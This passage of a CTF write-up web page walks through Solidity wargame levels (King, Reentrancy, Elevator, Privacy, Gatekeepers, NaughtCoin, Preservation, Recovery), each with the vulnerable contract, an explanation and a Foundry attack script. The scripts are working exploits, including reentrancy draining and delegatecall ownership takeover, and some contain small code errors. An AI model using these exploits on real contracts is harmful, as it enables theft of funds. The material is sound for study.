                                </li>
                            </ul>
                        </span>

                        <h5>>> Solution : </h5>
                        <ul>
                            <li>
                                To become a king we have to send the ethers greater than or equal to the price of
                                previous
                                king sent.
                            </li>
                            <li>
                                From a security standpoint, this is a huge concern in general because <b>receive()</b>
                                function allows the owner to reset everything without repaying the current king and
                                leaving
                                <b>funds stuck</b> in the contract.
                            </li>
                            <li>
                                First, we need to create and deploy a contract that does <b>not accept Ether</b>.
                            </li>

                            <li>
                                The only purpose of this contract is to become the new King and stop accepting Ether. By
                                not
                                implementing any payable functions, fallback or receive no one can send to this contract
                                Ether. Well, they can send it via a <b>selfdestroy()</b> but this is not the case!
                            </li>
                        </ul>
                    </div>
                    <br>

                    <span id="levelBox">KingSolve.s.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
    
import "forge-std/Script.sol";
import "forge-std/console.sol";
import {King} from "../src/King.sol";

contract KingSolve is Script {

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        King king = King(payable(0x1F4E18AA21104e948371494Dc52B41Fb7127CEa7));

        uint _prize = king.prize();
        console.log("Current King : ", king._king());

        new Attack().attack{value: _prize}();
        console.log("Final King : ", king._king());
        vm.stopBroadcast();
    }
}

contract Attack{

    function attack(address _king) public payable{
        _king.call{value : msg.value}("");
    }

}
</code>
                </pre>
                    </div>

                    <h5>>> Run script : </h5>
                    <div class="repo">
                        <span>$ source .env</span><br>
                        <span>$ forge script script/KingSolve.s.sol:KingSolve --rpc-url $RPC_URL
                            --broadcast</span>
                    </div>
                </div>
                <hr class="breakLine">

                <!-- 10-Reentrancy -->
                <div>
                    <h4>10-Reentrancy</h4>
                    <span id="levelBox">Reentrancy.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin/contracts/utils/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
</code>
</pre>
                    </div>

                    <div>
                        <h5>>> Goal :</h5>
                        <span>
                            <ul>
                                <li>
                                    The goal of this level is for you to steal all the funds from the contract.
                                </li>
                            </ul>
                        </span>

                        <h5>>> Solution : </h5>
                        <ul>
                            <li>Here we can drain the funds by <b>en-entering</b> the withdraw() function over and over
                                times.</li>
                            <li>In <b>withdraw()</b> the state variables are updating after sending the ethers.</li>
                            <li>We can drain funds by depositing with a initial amount and call withdraw() , while
                                receiving
                                ethers that we depositied we again call the withdraw() inside the Attack smart contract
                                in
                                <b>receive()</b> function.
                            </li>
                            <li>We need to check the balance of the Reentrance contract before reentering because when
                                we
                                call the withdraw again after the balance of Reentrance becomes zero will revert the
                                entire
                                transaction.</li>
                            <li>
                                <b>NOTE</b> : <i>Update the state variables before the transfering ethers or tokens.
                                    Its always better to use <a
                                        href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol"
                                        target="_blank"> re-entrancy guard</a>
                                    contract.</i>
                            </li>
                        </ul>
                    </div>
                    <br>

                    <span id="levelBox">ReentrancySolve.s.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Reentrance} from "../src/Reentrancy.sol";

contract ReentrancySolve is Script {
    Reentrance public reentrance = Reentrance(0xA79006498B8Cacb8d9D8F4cdD29f7328f9188f19);

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Before Balance : ", address(reentrance).balance);

        Attack hacker = new Attack(address(reentrance));
        hacker.attack{value: 0.001 ether}();

        console.log("After Balance : ", address(reentrance).balance);
        vm.stopBroadcast();
    }
}

interface IReentrancy {
    function donate(address) external payable;
    function withdraw(uint256) external;
}

contract Attack {
    IReentrancy private immutable target;

    constructor(address _target) {
        target = IReentrancy(_target);
    }

    // NOTE: attack cannot be called inside constructor
    function attack() external payable {
        target.donate{value: 1e17}(address(this));
        target.withdraw(1e17);

        require(address(target).balance == 0, "target balance > 0");
    }

    receive() external payable {
        uint256 amount = min(1e17, address(target).balance);  // 0.1 ether exploit at every reentrancy call.
        if (amount > 0) {
            target.withdraw(amount);
        }
    }

    function min(uint256 x, uint256 y) private pure returns (uint256) {
        return x <= y ? x : y;
    }
}
</code>
                </pre>
                    </div>

                    <h5>>> Run script : </h5>
                    <div class="repo">
                        <span>$ source .env</span><br>
                        <span>$ forge script script/ReentrancySolve.s.sol:ReentrancySolve --rpc-url $RPC_URL
                            --broadcast</span>
                    </div>
                </div>
                <hr class="breakLine">

                <!-- 11-Elevator -->
                <div>
                    <h4>11-Elevator</h4>
                    <span id="levelBox">Elevator.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
</code>
</pre>
                    </div>

                    <div>
                        <h5>>> Goal :</h5>
                        <span>
                            <ul>
                                <li>
                                    The goal of this level is to reach the elevator to top of the building.
                                </li>
                            </ul>
                        </span>

                        <h5>>> Solution : </h5>
                        <ul>
                            <li>
                                Here in <b>goto()</b> never trust an external actor as an assumption.
                            </li>
                            <li>
                                The <b>msg.sender (the Building contract)</b> is an external actor. We only know that it
                                must
                                implement the Building interface, so it must have a function called
                                <b>isLastFloor()</b>.
                            </li>
                            <li>
                                Trick the Elevator to think that we have not reached the top of the building when it
                                <b>first calls</b> the isLastFloor function and then return true (we have reached the
                                top)
                                when it calls it the <b>second time</b>.
                            </li>
                            <li>
                                In first call of isLastFloor() we return <b>false</b> and from second call of
                                isLastFloor()
                                we return <b>true</b> by updating the state of top variable in attack contract in first
                                call
                                of is isLastFloor() function.
                            </li>
                        </ul>
                    </div>
                    <br>

                    <span id="levelBox">ElevatorSolve.s.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Elevator} from "../src/Elevator.sol";

contract ElevatorSolve is Script {
    Elevator public elevator = Elevator(0x6E1515CAE054342e034d30860Cd4578ef84e63E8);

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Elevator at top : ", elevator.top());

        Attack hacker = new Attack(address(elevator));
        hacker.attack();

        console.log("Elevator at top : ", elevator.top());
        vm.stopBroadcast();
    }
}

interface IElevator {
    function goTo(uint256) external;
    function top() external view returns (bool);
}

contract Attack {
    IElevator private immutable target;
    bool top = true;

    constructor(address _target) {
        target = IElevator(_target);
    }

    function attack() external {
        target.goTo(1);
        require(target.top(), "not top");
    }

    function isLastFloor(uint256) external returns (bool) {
        top = !top;
        return top;
    }
}
</code>
                </pre>
                    </div>

                    <h5>>> Run script : </h5>
                    <div class="repo">
                        <span>$ source .env</span><br>
                        <span>$ forge script script/ElevatorSolve.s.sol:ElevatorSolve --rpc-url $RPC_URL
                            --broadcast</span>
                    </div>
                </div>
                <hr class="breakLine">

                <!-- 12-Privacy -->
                <div>
                    <h4>12-Privacy</h4>
                    <span id="levelBox">Privacy.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }

    /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
    */
}
</code>
</pre>
                    </div>

                    <div>
                        <h5>>> Goal :</h5>
                        <span>
                            <ul>
                                <li>
                                    The goal of this level is to unlock the state variable to false.
                                </li>
                            </ul>
                        </span>

                        <h5>>> Solution : </h5>
                        <ul>
                            <li>
                                <b>slot_0</b>: locked is of type bool so it would take 8 bits (1 byte) but because the
                                next
                                variable cannot be packed with this, Solidity reserve for the locked variable an entire
                                storage.
                            </li>
                            <li>
                                <b>slot_1</b>: ID is of type address so it would take 20 bytes. Same as before, it
                                cannot be
                                packed and will take an entire storage.
                            </li>
                            <li>
                                <b>slot_2</b>: flattening, denomination and awkwardness can all be packed together
                                because in
                                total they only need 8 bits + 8 bits + 16 bits = 32 bits.
                            </li>
                            <li>
                                <b>From slot_3 to slot_5</b>: data is a static size bytes32 array of 3 elements. Each
                                element
                                will take a single slot.
                            </li>
                            <li>
                                The “secret” key we need to unlock the contract is stored in the <b>fifth slot (5th)
                                </b>
                                of the storage layout of the contract.
                            </li>
                            <li>
                                We perform a downcast of that 5th slot value to bytes16.
                            </li>
                        </ul>
                    </div>
                    <br>

                    <span id="levelBox">PrivacySolve.s.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Privacy} from "../src/Privacy.sol";

contract PrivacySolve is Script {
    Privacy public privacy = Privacy(0x7414CBc5Af9A0A039839bD798D6C209AD89C9Cb4);

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        bytes32 slot5 = vm.load(address(privacy), bytes32(uint256(5)));
        console.logBytes32(slot5);

        console.log("Lock value : ", privacy.locked());

        privacy.unlock(bytes16(slot5));

        console.log("Lock value : ", privacy.locked());
        vm.stopBroadcast();
    }
}
</code>
                </pre>
                    </div>

                    <h5>>> Run script : </h5>
                    <div class="repo">
                        <span>$ source .env</span><br>
                        <span>$ forge script script/PrivacySolve.s.sol:PrivacySolve --rpc-url $RPC_URL
                            --broadcast</span>
                    </div>
                </div>
                <hr class="breakLine">

                <!-- 13-GatekeeperOne -->
                <div>
                    <h4>13-GatekeeperOne</h4>
                    <span id="levelBox">GatekeeperOne.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree partone");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree partthree");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
</code>
</pre>
                    </div>

                    <div>
                        <h5>>> Goal :</h5>
                        <span>
                            <ul>
                                <li>
                                    Make it past the gatekeeper and register as an entrant to pass this level.
                                </li>
                            </ul>
                        </span>

                        <h5>>> Solution : </h5>
                        <ul>
                            <li>
                                To pass challenge we have to solve all three gates in a single transaction.
                            </li>
                            <li>
                                In first gate we cleary observe that transaction caller and message sender not should be
                                eqaul, so we have to call the entrant() function <b>through a smart contract</b>. Then
                                we pass
                                the first gate.
                            </li>
                            <li>
                                In second gate we have to send the exact gas which after completing transaction the left
                                gas() should be <b>multiple of 8191</b> number. So we passing gas amount of <b>8191 * 10
                                    +
                                    gas</b> while calling enter() function.
                            </li>
                            <li>
                                In third gate we have to pass the bytes8 of gatekey values<ul>
                                    <li>
                                        the first requirement: <b>uint32(uint64(_gateKey)) ==
                                            uint16(uint64(_gateKey))</b>. The
                                        less
                                        important 2 bytes must equal the less important 4 bytes. This means that we want
                                        to
                                        <b>"remove"</b> the 2 more important bytes of those 4 bytes, but maintain the
                                        value of
                                        the less
                                        important one.
                                    </li>
                                    <li>Because what we want is to make <b>0x11111111</b> be equal to
                                        <b>0x00001111</b>
                                        the
                                        mask to accomplish this is equal to <b>0x0000FFFF</b>.
                                    </li>
                                    <li>
                                        The second requirement says that the less important 8 bytes of the input must be
                                        different compared to the less important 4 bytes. We need to remember that we
                                        also have to maintain the first requirement. We have to make <b>0x00000000001111
                                            !=
                                            0xXXXXXXXX00001111</b>.</li>
                                    <li>To achieve that, we have to update our mask to make
                                        all the
                                        first 4 bytes "pass" to the output Our new mask will be
                                        <b>0xFFFFFFFF0000FFFF</b>.
                                    </li>
                                    <li>
                                        Now we just have to apply that mask to our <b>tx.origin cast to a bytes8</b> (an
                                        address is a 20 bytes type).
                                        The key to solve this third gate will be equal to
                                        <b>bytes8(uint64(uint160( address(player)))) & 0xFFFFFFFF0000FFFF</b>.
                                    </li>
                                </ul>
                            </li>
                        </ul>
                    </div>
                    <br>

                    <span id="levelBox">GatekeeperOneSolve.s.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

contract GatekeeperOneSolve is Script {
    address public gatekeeperOne = 0xD821C7f2455DAE6F436ac6B44480b7F31F09838C;

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Initial entrant : ", IGateKeeperOne(gatekeeperOne).entrant());

        Attack hack = new Attack();
        hack.attack(gatekeeperOne, 1000);

        console.log("New entrant : ", IGateKeeperOne(gatekeeperOne).entrant());
        vm.stopBroadcast();
    }
}

interface IGateKeeperOne {
    function entrant() external view returns (address);
    function enter(bytes8) external returns (bool);
}

contract Attack {
    function attack(address _target, uint256 gas) external {
        IGateKeeperOne target = IGateKeeperOne(_target);
        // k = uint64(key)
        // 1. uint32(k) = uint16(k)
        // 2. uint32(k) != k
        // 3. uint32(k) == uint16(uint160(tx.origin))

        // 3. uint32(k) == uint16(uint160(tx.origin))
        // 1. uint32(k) = uint16(k)
        uint16 k16 = uint16(uint160(tx.origin));
        // 2. uint32(k) != k
        uint64 k64 = uint64(1 << 63) + uint64(k16);

        bytes8 key = bytes8(k64);

        require(gas < 8191, "gas > 8191");
        require(target.enter{gas: 8191 * 10 + gas}(key), "failed");
    }
}

</code>
                </pre>
                    </div>

                    <h5>>> Run script : </h5>
                    <div class="repo">
                        <span>$ source .env</span><br>
                        <span>$ forge script script/GatekeeperOneSolve.s.sol:GatekeeperOneSolve --rpc-url $RPC_URL
                            --broadcast</span>
                    </div>
                </div>
                <hr class="breakLine">

                <!-- 14-GatekeeperTwo -->
                <div>
                    <h4>14-GatekeeperTwo</h4>
                    <span id="levelBox">GatekeeperTwo.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64)max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
</code>
</pre>
                    </div>

                    <div>
                        <h5>>> Goal :</h5>
                        <span>
                            <ul>
                                <li>
                                    Make it past the gatekeeper and register as an entrant to pass this level.
                                </li>
                            </ul>
                        </span>

                        <h5>>> Solution : </h5>
                        <ul>
                            <li>
                                It is similar to <b>gatekeeperOne</b> challenge, but here we have another gate
                                conditions to
                                pass.
                            </li>
                            <li>
                                In first gate we cleary observe that transaction caller and message sender not should be
                                eqaul, so we have to call the <b>entrant()</b> function through a <b>smart contract</b>.
                                Then we pass
                                the first gate.
                            </li>
                            <li>
                                In second gate check the contract code size should be <b>0</b>, When called from the
                                constructor, the contract’s final code is not yet returned to the <b>evm</b> and it will
                                only
                                be done after finishing this call, as a result the codesize will still be 0 at the
                                caller’s address. so, <b>extcodesize</b> returns 0 when called from the constructor
                                allowing
                                us to pass this gate.
                            </li>
                            <li>
                                We know that <b>XOR</b> produces a <b>high output(1)</b> only when the number of high
                                inputs is odd. If the number of high inputs is even, the output is <b>low(0)</b>.
                            </li>
                            <li>
                                So, to make <b>a ^ b = type(uint64).max</b> (all are 1's), b must be the <b>inverse</b>
                                of a. The correct gateKey by executing
                                <b>type(uint64).max ^ uint64(bytes8 (keccak256(abi.encodePacked( address(this)))))</b>
                            </li>
                        </ul>
                    </div>
                    <br>

                    <span id="levelBox">GatekeeperTwoSolve.s.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

contract GatekeeperTwoSolve is Script {
    address public gatekeeperTwo = 0xf8aAeFefCf789e1df5c48760c64D52ECd25265cf;

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Initial entrant : ", IGateKeeperTwo(gatekeeperTwo).entrant());

        // attackk should be execute in constructor only
        Attack hack = new Attack(gatekeeperTwo);

        console.log("New entrant : ", IGateKeeperTwo(gatekeeperTwo).entrant());
        vm.stopBroadcast();
    }
}

interface IGateKeeperTwo {
    function entrant() external view returns (address);
    function enter(bytes8) external returns (bool);
}

contract Hack {
    constructor(IGateKeeperTwo target) {
        // Bitwise xor
        // a     = 1010
        // b     = 0110
        // a ^ b = 1100

        // a ^ a ^ b = b

        // a     = 1010
        // a     = 1010
        // a ^ a = 0000

        // max = 11...11
        // s ^ key = max
        // s ^ s ^ key = s ^ max 
        //         key = s ^ max 
        uint64 s = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 k = type(uint64).max ^ s;
        bytes8 key = bytes8(k);
        require(target.enter(key), "failed");
    }
}
</code>
                </pre>
                    </div>

                    <h5>>> Run script : </h5>
                    <div class="repo">
                        <span>$ source .env</span><br>
                        <span>$ forge script script/GatekeeperTwoSolve.s.sol:GatekeeperTwoSolve --rpc-url $RPC_URL
                            --broadcast</span>
                    </div>
                </div>
                <hr class="breakLine">

                <!-- 15-NaughtCoin -->
                <div>
                    <h4>15-NaughtCoin</h4>
                    <span id="levelBox">NaughtCoin.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}
</code>
</pre>
                    </div>

                    <div>
                        <h5>>> Goal :</h5>
                        <span>
                            <ul>
                                <li>
                                    NaughtCoin is an ERC20 token and you're already holding all of them. The catch is
                                    that you'll only be able to transfer them after a 10 year lockout period. Can you
                                    figure out how to get them out to another address so that you can transfer them
                                    freely? Complete this level by getting your token balance to 0.
                                </li>
                            </ul>
                        </span>

                        <h5>>> Solution : </h5>
                        <ul>
                            <li>Here NaughtCoin implements <b>ERC20</b> token standrad, so it executes all functions of
                                ERC20 contract.</li>
                            <li>
                                In ERC20 standrad we caan transfer tokens in different ways.
                            </li>
                            <li>
                                But here NaughtCoin only applies <b>lockTokens()</b> modifier on <b>transfer()</b> only,
                                we can also transfer tokens by <b>approving</b> the user and using <b>transferFrom()</b>
                                function.
                            </li>
                            <li>
                                Here we used transferFrom() by approving <b>attack contract</b> to use coins instead of
                                <b>player</b> balance.
                            </li>
                        </ul>
                    </div>
                    <br>

                    <span id="levelBox">NaughtCoinSolve.s.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {NaughtCoin} from "../scr/NaughtCoin.sol";

contract NaughtCoinSolve is Script {
    NaughtCoin public naughtCoin = NaughtCoin(0xca72EC4b4Bd117a2705440c3600309Ac4D94d481);

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address player = naughtCoin.player();
        uint bal = naughtCoin.balanceOf(player);

        console.log("Player : ", player);
        console.log("Player initial balance : ", bal);
        
        Attack attack = new Attack();
        console.log("Attack Address : ", address(attack));
        
        naughtCoin.approve(address(attack), bal);

        attack.exploit(naughtCoin);

        console.log("Player Balance : ", naughtCoin.balanceOf(player));
        console.log("Attacker Balance : ", naughtCoin.balanceOf(address(attack)));

        vm.stopBroadcast();
    }
}

contract Attack {
    function exploit(NaughtCoin coin) external {
        address player = coin.player();
        uint256 bal = coin.balanceOf(player);
        coin.transferFrom(player, address(this), bal);
    }
}
</code>
                </pre>
                    </div>

                    <h5>>> Run script : </h5>
                    <div class="repo">
                        <span>$ source .env</span><br>
                        <span>$ forge script script/NaughtCoinSolve.s.sol:NaughtCoinSolve --rpc-url $RPC_URL
                            --broadcast</span>
                    </div>
                </div>
                <hr class="breakLine">

                <!-- 16-Preservation -->
                <div>
                    <h4>16-Preservation</h4>
                    <span id="levelBox">Preservation.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
</code>
</pre>
                    </div>

                    <div>
                        <h5>>> Goal :</h5>
                        <span>
                            <ul>
                                <li>
                                    This contract utilizes a library to store two different times for two different
                                    timezones. The constructor creates two instances of the library for each time to be
                                    stored.
                                </li>
                                <li>
                                    The goal of this level is for you to claim ownership of the instance you are given.
                                </li>
                            </ul>
                        </span>

                        <h5>>> Solution : </h5>
                        <ul>
                            <li>
                                When the Preservation contract execute <b>setFirstTime()</b> it will call
                                <b>LibraryContract.setTime()</b> via <b>delegatecall</b>.
                            </li>
                            <li>
                                As we know delegatecall runs the call in the context of the <b>calle</b> contract and
                                updates the storage of the <b>caller</b> contract.
                            </li>
                            <li>
                                when <b>LibraryContract.setTime</b> update the storedTime state variable is not updating
                                the variable from its own contract but the one in <b>slot0</b> of the caller contract
                                that is the timeZone1Library address.
                            </li>
                            <li>
                                The same thing happens when the setSecondTime function is executed, it will update the
                                variable in slot0 of the Preservation contract.
                            </li>
                            <li>Here i will create a same storage logic attacker contract to make delegate call to
                                update the owner address.
                            </li>
                            <li>
                                If we replace the slot0 address with an address of <b>attacker</b> contract by calling
                                <b>delegate call</b>.
                            </li>
                        </ul>
                    </div>
                    <br>

                    <span id="levelBox">PreservationSolve.s.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Preservation} from "../scr/Preservation.sol";

contract PreservationSolve is Script {
    Preservation public preservation = Preservation(0xE1B1224Da4D5B09233CAaBEEa48036F98Ec68519);

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Preservation owner : ", preservation.owner());
        
        Attack hack = new Attack();
        console.log("Attacker Address : ", address(hack));
        
        hack.attack(preservation);

        console.log("Preservation owner : ", preservation.owner());
        vm.stopBroadcast();
    }
}

contract Attack {
    // Align storage layout same as Preservation
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function attack(Preservation target) external {
        // set library to this contract
        target.setFirstTime(uint256(uint160(address(this))));
        // call setFirstTime to execute code inside this contract and update owner state variable
        // To pass this challenge, new owner must be the player (msg.sender)
        target.setFirstTime(uint256(uint160(msg.sender)));
        require(target.owner() == msg.sender, "hack failed");
    }

    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }
}
</code>
                </pre>
                    </div>

                    <h5>>> Run script : </h5>
                    <div class="repo">
                        <span>$ source .env</span><br>
                        <span>$ forge script script/PreservationSolve.s.sol:PreservationSolve --rpc-url $RPC_URL
                            --broadcast</span>
                    </div>
                </div>
                <hr class="breakLine">

                <!-- 17-Recovery -->
                <div>
                    <h4>17-Recovery</h4>
                    <span id="levelBox">Recovery.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    string public name;
    mapping(address => uint256) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    // allow transfers of tokens
    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}
</code>
</pre>
                    </div>

                    <div>
                        <h5>>> Goal :</h5>
                        <span>
                            <ul>
                                <li>
                                    A contract creator has built a very simple token factory contract. Anyone can create
                                    new tokens with ease. After deploying the first token contract, the creator sent
                                    0.001 ether to obtain more tokens. They have since lost the contract address.
                                </li>
                                <li>
                                    This level will be completed if you can recover (or remove) the 0.001 ether from the
                                    lost contract address.
                                </li>
                            </ul>
                        </span>

                        <h5>>> Solution : </h5>
                        <ul>
                            <li>
                                Any one can deploy SimpleToken contract and funds are stored inside the contact.
                            </li>
                            <li>
                                Here we lost the SimpleToken contract address that we deployed and we have some funds
                                inside it, we have to recover them but we lost the contract address.
                            </li>
                            <li>
                                As soon as we find a way to retrieve the address of the deployed SimpleToken we can call
                                the destroy function that will execute a <b>selfdestruct()</b> sending all the
                                contract's
                                balance to the our address as any one can call selfdestruct() function.
                            </li>
                            <li>
                                The address of the new account is defined as being the rightmost 160 bits of the
                                <b>Keccak-256</b> hash of the <b>RLP encoding</b> of the structure containing only the
                                sender and the
                                account nonce. For <b>CREATE2</b> the rule is different and is described in <b>EIP-1014
                                    by Buterin.</b>
                            </li>
                            <li>
                                note: nonces works differently for EOA and Contracts. While for a contract, the nonce is
                                the number of contract that the contract itself has created, for EOA the nonce is the
                                number of transaction that it has made.
                            </li>
                            <li>
                                To get the contrcat address we use
                                <b>address(uint160(uint256( keccak256(abi.encodePacked( bytes1(0xd6), bytes1(0x94),
                                    address(_creator), bytes1(0x01))))))</b> formula which was published in <b>Yellow
                                    paper</b>
                            </li>
                            <li>
                                <b>0xd6</b> and <b>0x94</b> are constants and the last byte1 is the <b>nonce</b>, i.e,
                                number contracts created from the existed contract. We assume that its one.
                            </li>
                        </ul>
                    </div>
                    <br>

                    <span id="levelBox">RecoverySolve.s.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Recovery} from "../src/Recovery.sol";

contract RecoverySolve is Script {
    Recovery public recovery = Recovery(0xe0f837ccc4ED52424Dd00063DE97Ad1fE86996a8);

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address wallet = 0xd0509B83468409A75De2771C1Ae7bE1026A69927;
        
        Attack attack = new Attack();
        console.log("Attack Address : ", address(attack));
        console.log("Before recover balance : ", wallet.balance);
        
        address token = attack.recover(payable(wallet));
        
